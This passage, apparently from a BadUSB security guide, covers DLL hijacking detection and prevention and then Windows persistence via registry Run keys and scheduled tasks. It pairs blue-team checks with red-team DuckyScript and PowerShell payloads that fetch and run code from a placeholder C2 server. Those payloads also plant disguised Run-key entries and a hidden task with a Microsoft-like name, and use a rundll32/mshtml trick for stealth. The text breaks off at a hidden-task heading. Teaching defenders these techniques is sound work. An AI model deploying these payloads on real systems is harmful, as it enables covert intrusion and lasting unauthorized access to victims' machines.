## Defensive: Detecting DLL Hijacking

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DEFENSIVE: DETECTING DLL HIJACKING ATTACKS                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ DETECTION METHOD 1: SYSMON MONITORING                                        │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ Sysmon Event ID 7 (Image Loaded) tracks all DLL loads            │      │
│ │                                                                    │      │
│ │ SYSMON CONFIG FOR DLL MONITORING:                                 │      │
│ │ ┌──────────────────────────────────────────────────────────────┐  │      │
│ │ │ <ImageLoad onmatch="include">                                │  │      │
│ │ │   <!-- Alert on DLLs loaded from suspicious locations -->   │  │      │
│ │ │   <ImageLoaded condition="contains">                         │  │      │
│ │ │     \AppData\Local\Temp\                                     │  │      │
│ │ │   </ImageLoaded>                                             │  │      │
│ │ │   <ImageLoaded condition="contains">                         │  │      │
│ │ │     \Downloads\                                              │  │      │
│ │ │   </ImageLoaded>                                             │  │      │
│ │ │   <ImageLoaded condition="contains">                         │  │      │
│ │ │     \Desktop\                                                │  │      │
│ │ │   </ImageLoaded>                                             │  │      │
│ │ │   <!-- DLL loaded from application directory but unsigned -->│  │      │
│ │ │   <Signed condition="is">false</Signed>                     │  │      │
│ │ │ </ImageLoad>                                                 │  │      │
│ │ └──────────────────────────────────────────────────────────────┘  │      │
│ │                                                                    │      │
│ │ DETECTION QUERY (Event ID 7):                                     │      │
│ │ ┌──────────────────────────────────────────────────────────────┐  │      │
│ │ │ # PowerShell: Find suspicious DLL loads                     │  │      │
│ │ │ Get-WinEvent -FilterHashtable @{                            │  │      │
│ │ │     LogName = 'Microsoft-Windows-Sysmon/Operational'        │  │      │
│ │ │     ID = 7                                                   │  │      │
│ │ │ } | Where-Object {                                          │  │      │
│ │ │     $_.Message -match 'Signed:\s*false' -and               │  │      │
│ │ │     $_.Message -notmatch 'System32|SysWOW64'               │  │      │
│ │ │ } | Select-Object TimeCreated, Message                     │  │      │
│ │ └──────────────────────────────────────────────────────────────┘  │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ DETECTION METHOD 2: BASELINE COMPARISON                                      │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ # Create baseline of legitimate DLLs in application directories  │      │
│ │ $baseline = Get-ChildItem "C:\Program Files\*\*.dll" -Recurse |  │      │
│ │     Select-Object FullName, @{N='Hash';E={(Get-FileHash $_).Hash}}│      │
│ │ $baseline | Export-Csv "C:\Security\dll_baseline.csv"            │      │
│ │                                                                    │      │
│ │ # Later: Compare current state to baseline                       │      │
│ │ $current = Get-ChildItem "C:\Program Files\*\*.dll" -Recurse |   │      │
│ │     Select-Object FullName, @{N='Hash';E={(Get-FileHash $_).Hash}}│      │
│ │                                                                    │      │
│ │ # Find new or modified DLLs                                      │      │
│ │ Compare-Object $baseline $current -Property FullName, Hash |     │      │
│ │     Where-Object { $_.SideIndicator -eq '=>' }                   │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ DETECTION METHOD 3: PROCESS MONITOR ALERTS                                   │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ Look for:                                                         │      │
│ │ • DLLs loaded from user-writable directories                     │      │
│ │ • Unsigned DLLs in application directories                       │      │
│ │ • DLLs with recent creation dates in old application folders    │      │
│ │ • DLLs that don't match known-good hashes                        │      │
│ │ • Multiple failed DLL load attempts (enumeration)                │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ RED FLAGS TO MONITOR:                                                        │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ ⚠️ DLL loaded from %TEMP% or %APPDATA%\Local\Temp                  │      │
│ │ ⚠️ DLL loaded from Downloads folder                                │      │
│ │ ⚠️ Unsigned DLL loaded by signed application                       │      │
│ │ ⚠️ DLL with same name as system DLL in application folder         │      │
│ │ ⚠️ DLL created after application installation date                 │      │
│ │ ⚠️ DLL with low entropy (possibly packed/obfuscated)              │      │
│ │ ⚠️ DLL making network connections after load                       │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Defensive: Preventing DLL Hijacking

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DEFENSIVE: PREVENTING DLL HIJACKING                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PREVENTION 1: SAFEDLLSEARCHMODE                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ REGISTRY KEY:                                                      │      │
│ │ HKLM\System\CurrentControlSet\Control\Session Manager             │      │
│ │ SafeDllSearchMode = 1 (DWORD)                                     │      │
│ │                                                                    │      │
│ │ This moves "Current Directory" later in the search order          │      │
│ │ DEFAULT: Enabled on Windows Vista and later                       │      │
│ │                                                                    │      │
│ │ VERIFY IT'S ENABLED:                                               │      │
│ │ Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ PREVENTION 2: CWDILLEGALINPATH                                               │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ REGISTRY KEY:                                                      │      │
│ │ HKLM\System\CurrentControlSet\Control\Session Manager             │      │
│ │ CWDIllegalInDllSearch = 2 (DWORD)                                 │      │
│ │                                                                    │      │
│ │ Values:                                                            │      │
│ │ 0 = Default behavior                                              │      │
│ │ 1 = Block CWD for DLLs on remote shares only                     │      │
│ │ 2 = Block CWD for all DLLs completely                            │      │
│ │ 0xFFFFFFFF = Block CWD globally                                  │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ PREVENTION 3: APPLICATION MANIFEST                                           │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ Developers can specify exact DLL paths in application manifest:   │      │
│ │                                                                    │      │
│ │ <?xml version="1.0" encoding="UTF-8"?>                            │      │
│ │ <assembly manifestVersion="1.0">                                  │      │
│ │   <dependency>                                                    │      │
│ │     <dependentAssembly>                                           │      │
│ │       <assemblyIdentity                                           │      │
│ │         name="Microsoft.VC90.CRT"                                 │      │
│ │         version="9.0.21022.8"                                     │      │
│ │         type="win32" />                                           │      │
│ │     </dependentAssembly>                                          │      │
│ │   </dependency>                                                   │      │
│ │ </assembly>                                                       │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ PREVENTION 4: APPLICATION CONTROL (AppLocker/WDAC)                           │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ WINDOWS DEFENDER APPLICATION CONTROL (WDAC):                      │      │
│ │ • Whitelist only signed DLLs                                     │      │
│ │ • Block DLLs from user-writable locations                        │      │
│ │ • Require specific publisher signatures                          │      │
│ │                                                                    │      │
│ │ APPLOCKER DLL RULES:                                              │      │
│ │ • Create rules to allow only trusted DLLs                        │      │
│ │ • Block DLLs from %TEMP%, %APPDATA%, etc.                        │      │
│ │                                                                    │      │
│ │ POWERSHELL APPLOCKER RULE EXAMPLE:                                │      │
│ │ New-AppLockerPolicy -RuleType Dll -User Everyone `               │      │
│ │   -RuleNamePrefix "Block" -Action Deny `                         │      │
│ │   -Path "%TEMP%\*"                                               │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ PREVENTION 5: PERMISSION HARDENING                                           │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ # Remove write permissions from application directories          │      │
│ │ $path = "C:\Program Files\VulnerableApp"                         │      │
│ │ $acl = Get-Acl $path                                             │      │
│ │ $acl.SetAccessRuleProtection($true, $true)                       │      │
│ │                                                                    │      │
│ │ # Remove Users write access                                       │      │
│ │ $rule = New-Object Security.AccessControl.FileSystemAccessRule(  │      │
│ │     "BUILTIN\Users", "Write", "Deny")                            │      │
│ │ $acl.AddAccessRule($rule)                                         │      │
│ │ Set-Acl $path $acl                                               │      │
│ │                                                                    │      │
│ │ # Audit PATH directories for write permissions                   │      │
│ │ $env:PATH -split ';' | ForEach-Object {                          │      │
│ │     icacls $_ 2>$null | Select-String "Users:(OI)(CI)(W)"       │      │
│ │ }                                                                 │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## DLL Hijacking Audit Script

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ COMPLETE DLL HIJACKING AUDIT SCRIPT                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # DLL Hijacking Vulnerability Audit Script                       │      │
│ │ # For authorized security testing only                           │      │
│ │                                                                    │      │
│ │ Write-Host "=== DLL HIJACKING AUDIT ===" -ForegroundColor Cyan   │      │
│ │                                                                    │      │
│ │ # 1. Check SafeDllSearchMode                                      │      │
│ │ Write-Host "`n[*] Checking SafeDllSearchMode..." -ForegroundColor Yellow │
│ │ $safe = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode -EA 0 │
│ │ if ($safe.SafeDllSearchMode -eq 1) {                              │      │
│ │     Write-Host "[OK] SafeDllSearchMode is ENABLED" -ForegroundColor Green │
│ │ } else {                                                          │      │
│ │     Write-Host "[VULN] SafeDllSearchMode is DISABLED!" -ForegroundColor Red │
│ │ }                                                                  │      │
│ │                                                                    │      │
│ │ # 2. Find writable directories in PATH                           │      │
│ │ Write-Host "`n[*] Checking PATH for writable directories..." -ForegroundColor Yellow │
│ │ $env:PATH -split ';' | Where-Object { $_ } | ForEach-Object {    │      │
│ │     $path = $_                                                     │      │
│ │     if (Test-Path $path) {                                        │      │
│ │         try {                                                      │      │
│ │             $testFile = Join-Path $path "dll_test_$(Get-Random).tmp" │
│ │             [IO.File]::Create($testFile).Close()                  │      │
│ │             Remove-Item $testFile -Force                          │      │
│ │             Write-Host "[VULN] Writable: $path" -ForegroundColor Red │
│ │         } catch {                                                  │      │
│ │             Write-Host "[OK] Not writable: $path" -ForegroundColor Green │
│ │         }                                                          │      │
│ │     }                                                              │      │
│ │ }                                                                  │      │
│ │                                                                    │      │
│ │ # 3. Find unsigned DLLs in Program Files                         │      │
│ │ Write-Host "`n[*] Scanning for unsigned DLLs in Program Files..." -ForegroundColor Yellow │
│ │ Get-ChildItem "C:\Program Files\*\*.dll" -Recurse -EA 0 | ForEach-Object { │
│ │     $sig = Get-AuthenticodeSignature $_.FullName                  │      │
│ │     if ($sig.Status -ne 'Valid') {                                │      │
│ │         Write-Host "[WARN] Unsigned: $($_.FullName)" -ForegroundColor Yellow │
│ │     }                                                              │      │
│ │ } | Select-Object -First 20  # Limit output                      │      │
│ │                                                                    │      │
│ │ # 4. Find recently modified DLLs (potential hijacks)             │      │
│ │ Write-Host "`n[*] Finding recently modified DLLs (last 7 days)..." -ForegroundColor Yellow │
│ │ $cutoff = (Get-Date).AddDays(-7)                                  │      │
│ │ Get-ChildItem "C:\Program Files\*\*.dll" -Recurse -EA 0 |        │      │
│ │     Where-Object { $_.LastWriteTime -gt $cutoff } |              │      │
│ │     Select-Object FullName, LastWriteTime |                      │      │
│ │     ForEach-Object {                                              │      │
│ │         Write-Host "[CHECK] $($_.FullName) - $($_.LastWriteTime)" -ForegroundColor Magenta │
│ │     }                                                              │      │
│ │                                                                    │      │
│ │ # 5. Check common hijackable application directories             │      │
│ │ Write-Host "`n[*] Checking common application directories..." -ForegroundColor Yellow │
│ │ $commonPaths = @(                                                 │      │
│ │     "$env:LOCALAPPDATA",                                          │      │
│ │     "$env:APPDATA",                                               │      │
│ │     "C:\Python*",                                                  │      │
│ │     "C:\Program Files\*\*"                                        │      │
│ │ )                                                                  │      │
│ │ # Additional checks would go here                                │      │
│ │                                                                    │      │
│ │ Write-Host "`n=== AUDIT COMPLETE ===" -ForegroundColor Cyan      │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ DUCKYSCRIPT TO RUN AUDIT:                                                    │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ REM Run DLL hijacking audit and save results                     │      │
│ │ DELAY 2000                                                         │      │
│ │ GUI r                                                              │      │
│ │ DELAY 500                                                          │      │
│ │ STRING powershell -ep bypass                                      │      │
│ │ ENTER                                                              │      │
│ │ DELAY 1500                                                         │      │
│ │ STRING IEX(New-Object Net.WebClient).DownloadString('http://YOURSERVER/dll_audit.ps1') | Out-File $env:TEMP\audit.txt │
│ │ ENTER                                                              │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

# PERSISTENT BACKDOORS - COMPREHENSIVE GUIDE

## Understanding Persistence

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ PERSISTENCE - THE COMPLETE PICTURE                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS PERSISTENCE?                                                         │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ Persistence is any technique that allows an attacker to maintain   │     │
│ │ access to a compromised system across:                              │     │
│ │                                                                     │     │
│ │ • System reboots                                                   │     │
│ │ • User logoffs/logons                                              │     │
│ │ • Password changes                                                 │     │
│ │ • Network disconnections                                           │     │
│ │ • Security tool scans (if done correctly)                         │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ WHY IS PERSISTENCE CRITICAL?                                                 │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ RED TEAM PERSPECTIVE:                                              │     │
│ │ • BadUSB provides only initial access (device is removed)         │     │
│ │ • Without persistence, access is lost on reboot                   │     │
│ │ • Multiple persistence methods provide redundancy                  │     │
│ │ • Some methods are stealthier than others                         │     │
│ │                                                                     │     │
│ │ BLUE TEAM PERSPECTIVE:                                             │     │
│ │ • Persistence is key indicator of compromise                       │     │
│ │ • Finding persistence = finding the attacker                       │     │
│ │ • Must check ALL persistence locations during IR                  │     │
│ │ • Some methods are harder to detect than others                   │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PERSISTENCE TAXONOMY:                                                        │
│                                                                              │
│   ┌────────────────┐  ┌────────────────┐  ┌────────────────┐                │
│   │    USER LEVEL  │  │  ADMIN LEVEL   │  │  SYSTEM LEVEL  │                │
│   │   (No Privs)   │  │ (Local Admin)  │  │   (SYSTEM)     │                │
│   ├────────────────┤  ├────────────────┤  ├────────────────┤                │
│   │ HKCU Run Keys  │  │ HKLM Run Keys  │  │ Services       │                │
│   │ Startup Folder │  │ Scheduled Tasks│  │ Drivers        │                │
│   │ User Sched Task│  │ Services       │  │ Boot Records   │                │
│   │ Browser Ext    │  │ WMI Subscript  │  │ Kernel Modules │                │
│   │ Office Add-ins │  │ DLL Hijacking  │  │ Hypervisor     │                │
│   └────────────────┘  └────────────────┘  └────────────────┘                │
│   Easier to deploy     More persistent     Most persistent                  │
│   Easier to detect     Harder to detect    Hardest to detect               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Method 1: Registry Run Keys (Deep Dive)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ REGISTRY RUN KEYS - COMPLETE ANALYSIS                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│ MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Registry       │
│ PRIVILEGE LEVEL: User (HKCU) or Admin (HKLM)                                │
│ PERSISTENCE: Survives reboots, triggers at logon                            │
│ STEALTH: Low-Medium (commonly checked by AV/EDR)                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ HOW IT WORKS - TECHNICAL EXPLANATION                                         │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ Windows checks specific registry keys at boot/logon and executes            │
│ any programs specified there. This is legitimate functionality              │
│ used by many programs, which is why it's also attractive for persistence.   │
│                                                                              │
│ EXECUTION FLOW:                                                              │
│                                                                              │
│   [System Boot]                                                              │
│        │                                                                     │
│        ▼                                                                     │
│   [HKLM\...\Run executed]  ◄── Runs as SYSTEM/Admin context                │
│        │                                                                     │
│        ▼                                                                     │
│   [User Logon]                                                               │
│        │                                                                     │
│        ▼                                                                     │
│   [HKCU\...\Run executed]  ◄── Runs as logged-in user                      │
│        │                                                                     │
│        ▼                                                                     │
│   [Desktop loads]                                                            │
│                                                                              │
│ ALL RUN KEY LOCATIONS (Complete List):                                       │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ USER LEVEL (HKCU) - No admin required:                            │     │
│ │ • HKCU\Software\Microsoft\Windows\CurrentVersion\Run              │     │
│ │ • HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce         │     │
│ │ • HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices     │     │
│ │ • HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce │     │
│ │ • HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon     │     │
│ │   (Shell, Userinit values)                                        │     │
│ │                                                                     │     │
│ │ ADMIN LEVEL (HKLM) - Requires elevation:                          │     │
│ │ • HKLM\Software\Microsoft\Windows\CurrentVersion\Run              │     │
│ │ • HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce         │     │
│ │ • HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run │  │
│ │ • HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon     │     │
│ │   (Shell, Userinit, Notify values)                                │     │
│ │                                                                     │     │
│ │ 32-BIT ON 64-BIT (WoW6432Node):                                   │     │
│ │ • HKLM\Software\WoW6432Node\Microsoft\Windows\CurrentVersion\Run │     │
│ │ • HKCU\Software\WoW6432Node\Microsoft\Windows\CurrentVersion\Run │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ RED TEAM: IMPLEMENTATION                                                     │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ DUCKYSCRIPT - BASIC REGISTRY PERSISTENCE:                                    │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ REM =====================================================          │     │
│ │ REM PAYLOAD: Registry Run Key Persistence                          │     │
│ │ REM TARGET: Windows 10/11                                          │     │
│ │ REM PRIVILEGE: User level (no admin needed)                        │     │
│ │ REM =====================================================          │     │
│ │                                                                     │     │
│ │ DELAY 2000                                                         │     │
│ │ GUI r                                                              │     │
│ │ DELAY 500                                                          │     │
│ │ STRING powershell -w hidden -ep bypass                            │     │
│ │ ENTER                                                              │     │
│ │ DELAY 1500                                                         │     │
│ │                                                                     │     │
│ │ REM Download payload to hidden location                           │     │
│ │ STRING $dir = "$env:APPDATA\Microsoft\Windows\Themes"             │     │
│ │ ENTER                                                              │     │
│ │ STRING mkdir $dir -Force | Out-Null                               │     │
│ │ ENTER                                                              │     │
│ │ STRING $p = "$dir\ThemeService.ps1"                               │     │
│ │ ENTER                                                              │     │
│ │ STRING (New-Object Net.WebClient).DownloadFile('http://C2/beacon.ps1', $p) │
│ │ ENTER                                                              │     │
│ │                                                                     │     │
│ │ REM Add to registry - blend with legitimate entries               │     │
│ │ STRING $cmd = "powershell -w hidden -ep bypass -f `"$p`""         │     │
│ │ ENTER                                                              │     │
│ │ STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ThemeService' -Value $cmd │
│ │ ENTER                                                              │     │
│ │ STRING exit                                                        │     │
│ │ ENTER                                                              │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ POWERSHELL - ADVANCED STEALTHY PERSISTENCE:                                  │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # More stealthy: Use rundll32 to execute                          │     │
│ │ $payload = @"                                                      │     │
│ │ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";          │     │
│ │ document.write();h=new%20ActiveXObject("WScript.Shell").Run(       │     │
│ │ "powershell -w hidden -ep bypass -c IEX(iwr http://C2/b)",0,true);│     │
│ │ "@                                                                  │     │
│ │                                                                     │     │
│ │ Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `│
│ │     -Name 'SecurityHealth' -Value $payload                        │     │
│ │                                                                     │     │
│ │ # Even stealthier: Use legitimate Windows binary path             │     │
│ │ # Abuse OneDrive sync or other trusted programs                   │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ BLUE TEAM: DETECTION                                                         │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ DETECTION METHOD 1: Manual Registry Check                                    │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # Check all Run keys                                               │     │
│ │ $paths = @(                                                        │     │
│ │     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",        │     │
│ │     "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",    │     │
│ │     "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",        │     │
│ │     "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",    │     │
│ │     "HKLM:\Software\WoW6432Node\Microsoft\Windows\CurrentVersion\Run" │  │
│ │ )                                                                  │     │
│ │                                                                     │     │
│ │ foreach ($path in $paths) {                                       │     │
│ │     Write-Host "`n=== $path ===" -ForegroundColor Yellow          │     │
│ │     Get-ItemProperty -Path $path -ErrorAction SilentlyContinue |  │     │
│ │         Select-Object * -ExcludeProperty PS* | Format-List        │     │
│ │ }                                                                  │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ DETECTION METHOD 2: Autoruns (Sysinternals)                                  │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # Download and run Autoruns                                        │     │
│ │ # https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns │     │
│ │                                                                     │     │
│ │ # Command-line version:                                            │     │
│ │ autorunsc.exe -a * -c -h -s -v -vt > autoruns_output.csv          │     │
│ │                                                                     │     │
│ │ # Flags:                                                           │     │
│ │ # -a *    = All autorun categories                                │     │
│ │ # -c      = CSV output                                            │     │
│ │ # -h      = Show file hashes                                      │     │
│ │ # -s      = Verify signatures                                     │     │
│ │ # -v -vt  = VirusTotal lookup                                     │     │
│ │                                                                     │     │
│ │ # LOOK FOR:                                                        │     │
│ │ # - Unsigned executables                                          │     │
│ │ # - PowerShell in value data                                      │     │
│ │ # - Base64 encoded commands                                       │     │
│ │ # - URLs in value data                                            │     │
│ │ # - Paths to temp folders                                         │     │
│ │ # - Recently modified entries                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ DETECTION METHOD 3: Sysmon Event Monitoring                                  │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ <!-- Sysmon config to detect Run key modifications -->            │     │
│ │ <Sysmon schemaversion="4.50">                                     │     │
│ │   <EventFiltering>                                                │     │
│ │     <RegistryEvent onmatch="include">                             │     │
│ │       <TargetObject condition="contains">CurrentVersion\Run</TargetObject> │
│ │       <TargetObject condition="contains">Winlogon</TargetObject>  │     │
│ │     </RegistryEvent>                                               │     │
│ │   </EventFiltering>                                                │     │
│ │ </Sysmon>                                                         │     │
│ │                                                                     │     │
│ │ # Event ID 12 = Registry key/value created or deleted            │     │
│ │ # Event ID 13 = Registry value modified                          │     │
│ │ # Event ID 14 = Registry key/value renamed                        │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ RED FLAGS TO LOOK FOR:                                                       │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ ⚠ powershell.exe with -enc or -e flag                            │     │
│ │ ⚠ cmd.exe /c with network commands                               │     │
│ │ ⚠ mshta.exe, wscript.exe, cscript.exe                            │     │
│ │ ⚠ Paths to %TEMP%, %APPDATA%, unusual locations                  │     │
│ │ ⚠ Base64 strings                                                 │     │
│ │ ⚠ URLs or IP addresses in command                                │     │
│ │ ⚠ Entry names mimicking legitimate software                      │     │
│ │ ⚠ Unsigned binaries                                              │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ REMOVAL PROCEDURE                                                            │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # Remove specific malicious entry                                  │     │
│ │ Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `│
│ │     -Name 'MaliciousEntry'                                         │     │
│ │                                                                     │     │
│ │ # Also delete the payload file                                    │     │
│ │ Remove-Item -Path "C:\Path\To\Payload.exe" -Force                 │     │
│ │                                                                     │     │
│ │ # Verify removal                                                   │     │
│ │ Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Method 2: Scheduled Tasks (Deep Dive)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ SCHEDULED TASKS - COMPLETE ANALYSIS                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│ MITRE ATT&CK: T1053.005 - Scheduled Task/Job: Scheduled Task                │
│ PRIVILEGE LEVEL: User or Admin (more options with admin)                    │
│ PERSISTENCE: Survives reboots, highly configurable triggers                 │
│ STEALTH: Medium (tasks visible in Task Scheduler, but can be hidden)       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ HOW IT WORKS - TECHNICAL EXPLANATION                                         │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ Windows Task Scheduler runs tasks based on triggers. Attackers abuse        │
│ this to execute malicious code at specific times or events.                 │
│                                                                              │
│ TASK COMPONENTS:                                                             │
│                                                                              │
│   ┌─────────────────────────────────────────────────────────────────┐       │
│   │                    SCHEDULED TASK                                │       │
│   ├─────────────────────────────────────────────────────────────────┤       │
│   │                                                                  │       │
│   │  TRIGGER (When)        ACTION (What)        CONDITIONS (If)     │       │
│   │  ─────────────         ────────────         ──────────────      │       │
│   │  • At logon            • Run program        • Only if idle      │       │
│   │  • At startup          • Send email         • Only on AC power  │       │
│   │  • On schedule         • Show message       • If network avail  │       │
│   │  • On event            • COM handler        • Wake to run       │       │
│   │  • On idle                                                      │       │
│   │  • On workstation                                               │       │
│   │    lock/unlock                                                  │       │
│   │                                                                  │       │
│   └─────────────────────────────────────────────────────────────────┘       │
│                                                                              │
│ TRIGGER TYPES (All can be abused):                                           │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ TRIGGER TYPE        │ WHEN IT FIRES           │ REQUIRES ADMIN     │     │
│ │ ────────────────────┼─────────────────────────┼────────────────── │     │
│ │ AtLogon             │ When any user logs in   │ No (for own user)│     │
│ │ AtStartup           │ When system boots       │ Yes               │     │
│ │ Daily/Weekly/Monthly│ Scheduled time          │ No                │     │
│ │ OnEvent             │ When event log entry    │ Varies            │     │
│ │ AtIdle              │ When system is idle     │ No                │     │
│ │ OnSessionConnect    │ When user session start │ Yes               │     │
│ │ OnWorkstationUnlock │ When screen unlocked    │ No                │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ RED TEAM: IMPLEMENTATION                                                     │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ DUCKYSCRIPT - SCHEDULED TASK PERSISTENCE:                                    │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ REM =====================================================          │     │
│ │ REM PAYLOAD: Scheduled Task Persistence (User Level)              │     │
│ │ REM TRIGGER: Every logon + every 30 minutes                       │     │
│ │ REM =====================================================          │     │
│ │                                                                     │     │
│ │ DELAY 2000                                                         │     │
│ │ GUI r                                                              │     │
│ │ DELAY 500                                                          │     │
│ │ STRING powershell -w hidden -ep bypass                            │     │
│ │ ENTER                                                              │     │
│ │ DELAY 1500                                                         │     │
│ │                                                                     │     │
│ │ REM Create action - what to run                                   │     │
│ │ STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -ep bypass -c "IEX(IWR http://C2/beacon -UseBasicParsing)"' │
│ │ ENTER                                                              │     │
│ │                                                                     │     │
│ │ REM Create triggers - when to run                                 │     │
│ │ STRING $trigger1 = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME │
│ │ ENTER                                                              │     │
│ │ STRING $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) │
│ │ ENTER                                                              │     │
│ │                                                                     │     │
│ │ REM Create settings - task behavior                               │     │
│ │ STRING $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries │
│ │ ENTER                                                              │     │
│ │                                                                     │     │
│ │ REM Register task with legitimate-looking name                    │     │
│ │ STRING Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateCore' -Action $action -Trigger $trigger1,$trigger2 -Settings $settings │
│ │ ENTER                                                              │     │
│ │ STRING exit                                                        │     │
│ │ ENTER                                                              │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ADVANCED: HIDDEN TASK (Requires Admin):                                      │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
